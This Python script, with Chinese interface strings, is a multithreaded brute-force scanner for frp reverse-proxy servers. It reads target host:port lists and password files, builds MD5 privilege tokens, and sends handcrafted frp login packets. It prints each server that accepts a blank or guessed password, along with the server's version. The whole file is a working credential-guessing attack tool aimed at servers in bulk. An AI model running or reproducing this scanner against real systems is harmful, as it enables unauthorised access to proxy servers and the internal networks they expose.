from sys import argv
from time import time
from re import findall
from queue import Queue
from hashlib import md5
from threading import Thread
from socket import socket, gethostbyname

def Frpc(args):
    try:
        Time, TCP = str(int(time())), socket()
        (HOST, Port), Pass = args[0].strip().split(":", 1), args[1].strip()
        Token = md5((Pass+Time).encode()).hexdigest()
        TCP.settimeout(3)
        TCP.connect((gethostbyname(HOST), int(Port)))
        TCP.send(b'\x00\x01\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00')
        TCP.send(b'\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\xc5o\x00\x00\x00\x00\x00\x00\x00\xbc'+f'{{"version":"0.32.0","hostname":"","os":"windows","arch":"amd64","user":"","privilege_key":"{Token}","timestamp":{Time},"run_id":"","metas":null,"pool_count":1}}'.encode())
        TCP.recv(12)
        TCP.recv(12)
        Version = findall('"version":"([\d\.]*)".*"error":""', TCP.recv(88).decode())
        if Version: print(f"\033[92m[+] {args[0].strip()} {Pass} <{Version[0]}>\033[0m")
    except:
        pass
    finally:
        TCP.close()

def RunTask(Task, Queues):
    while not Queues.empty():
        try:
            Frpc(Queues.get())
        except:
            pass
        finally:
            n = round(((Task-Queues.qsize())/Task)*100, 1)
            print(f"\033[96m[+] 当前进度: {n}%", end='\r')

def GetTask(List, Pass):
    Task, Time, Queues = [0], time(), Queue()
    for x in List:
        for y in Pass:
            Queues.put([x,y])
            Task[0] += 1
    for i in range(100):
        Task.append(Thread(target=RunTask, args=(Task[0], Queues)))
        Task[-1].start()
    for t in Task[1:]:
        t.join()
    print(f"\033[96m[+] 扫描完毕! 用时:{round(time()-Time, 1)}s")

if __name__ == "__main__":
    try:
        if len(argv)==2:
            Pass = [""]
        else:
            with open(argv[2]) as File:
                Pass = list(set(File.readlines()))
        with open(argv[1]) as File:
            GetTask(list(set(File.readlines())), Pass)
    except:
        print(f'\033[91m[-]\033[0m python3 {argv[0]} 列表文件 [密码文件]')
